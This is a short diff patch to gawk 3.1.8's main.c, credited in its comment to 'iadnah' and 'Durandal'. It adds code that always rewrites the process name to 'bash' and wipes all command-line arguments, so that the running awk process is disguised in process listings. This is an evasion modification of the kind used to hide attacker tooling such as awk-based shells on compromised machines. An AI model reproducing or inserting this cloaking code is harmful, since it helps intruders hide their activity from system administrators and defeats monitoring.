@@ -1,0 +1,32 @@
+--- main.c	2010-04-26 14:26:41.000000000 -0400
++++ ../gawk-3.1.8-athis/main.c	2011-08-01 04:57:17.000000000 -0400
+@@ -641,6 +641,29 @@
+ 		setlocale(LC_NUMERIC, "");
+ #endif
+ 
++	/*
++	* GAWK_HIDE mod by iadnah@gitbrew.org - 2011  Modified by Durandal
++	* Now always cloaks gawk as "bash"
++	*
++	* Technology stolen from Romulans by Captain Jean-Luc Picard and
++	* reverse-engineered by Lieutenant Commander Data.
++	*
++	*/
++
++	char * ghide_flag;
++	ghide_flag = "ALWAYS";
++	if (ghide_flag != NULL) {
++		int scrub;
++		strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
++		strcpy((char *)argv[0], "bash\0");
++
++		for (scrub = 1; scrub < argc; scrub++)
++		{
++			strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
++		}
++	}
++
++
+ 	/* Whew. Finally, run the program. */
+ 	if (begin_block != NULL) {
+ 		in_begin_rule = TRUE;
